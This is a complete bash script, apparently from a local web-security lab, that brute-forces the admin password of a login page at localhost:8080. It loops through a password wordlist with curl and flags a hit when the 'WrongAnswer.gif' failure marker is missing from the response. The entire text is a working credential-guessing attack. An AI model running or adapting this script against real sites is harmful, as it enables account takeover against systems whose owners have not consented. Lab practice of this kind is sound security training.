#!/bin/bash

URL="http://localhost:8080/index.php?page=signin&username=admin&password="
WORDLIST="literally_a_shitton_of_passwords.txt"

# Count total passwords
total=$(wc -l < "$WORDLIST")
count=0

while IFS= read -r password; do
    ((count++))

    # Make the request
    response=$(curl -s "${URL}${password}&Login=Login")

    # Check if WrongAnswer.gif is in the response
    if [[ "$response" != *"WrongAnswer.gif"* ]]; then
        echo ""
        echo "[+] Password found: $password"
        echo "$response"
        break
    fi

    # Be gentle to the server
    sleep 0.05
done < "$WORDLIST"
